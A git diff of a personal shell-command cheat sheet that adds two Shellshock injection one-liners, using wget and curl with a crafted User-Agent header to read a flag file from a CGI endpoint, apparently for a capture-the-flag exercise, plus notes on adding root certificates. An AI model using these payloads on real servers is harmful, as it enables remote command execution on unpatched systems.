@@ -262,10 +262,25 @@ ll | grep "^d"
 for i in $(ls -d */); do echo ${i%%/}; done
 ```
 
-* Shellshock with curl or wget
+* Shellshock with `wget`
+```bash
+wget localhost:10702/cgi-bin/board -U "() { :;  }; echo 'Content-Type: text/plain'; echo ; /bin/cat /proc/flag"
+```
+
+* Shellshock with `curl`
+```bash
+curl 3.95.14.86:10702/cgi-bin/board -H "User-Agent:() { :; }; echo 'Content-Type: text/plain'; echo ; /bin/cat /proc/flag"
+```
     
 ## Adding root certificate to OS
-* A
+* Adding certificate to `/urs/share/ca-certificate`
+```bash
+sudo cp certificate.crt /usr/share/ca-certificate/
+sudo dpkg-reconfigure ca-certificates
+sudo update-ca-certificates
+```
+
+* On Linux, Chromium uses the NSS (Network Security Services) Shared Database. NSS is a set of libraries designed to support cross-platform development of security-enabled client and server application. So to add a certificate to the NSS database, we can do the following: 
 ```bash
 certutil -d sql:$HOME/.pki/nssdb -A -t "C,," -n <certificate nickname> -i <certificate filename>
 ```
